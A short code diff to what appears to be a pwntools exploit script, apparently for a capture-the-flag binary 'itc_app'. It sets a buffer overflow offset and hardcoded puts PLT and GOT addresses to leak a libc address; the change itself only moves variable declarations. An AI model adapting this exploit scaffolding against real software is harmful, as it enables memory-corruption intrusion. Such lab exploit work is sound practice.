@@ -3,15 +3,11 @@ from pwn import process, ELF, context
 
 BUFFER = 132
 PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS = 0x8048340, 0x804847b, 0x80497ac
-WELCOME_DETECTED, LEAKED_ADDRESS = False, None
-
-
 
 def main():
 
     # Set the binary context
     binary_path = './itc_app'
-    elf = context.binary = ELF(binary_path)
 
     # Start the process
     proc = process()
@@ -26,6 +22,8 @@ def main():
 
     # Send the initial payload
     proc.sendline(payload)
+
+    WELCOME_DETECTED, LEAKED_ADDRESS = False, None
 
     # Process output to leak address
     for _ in range(10):
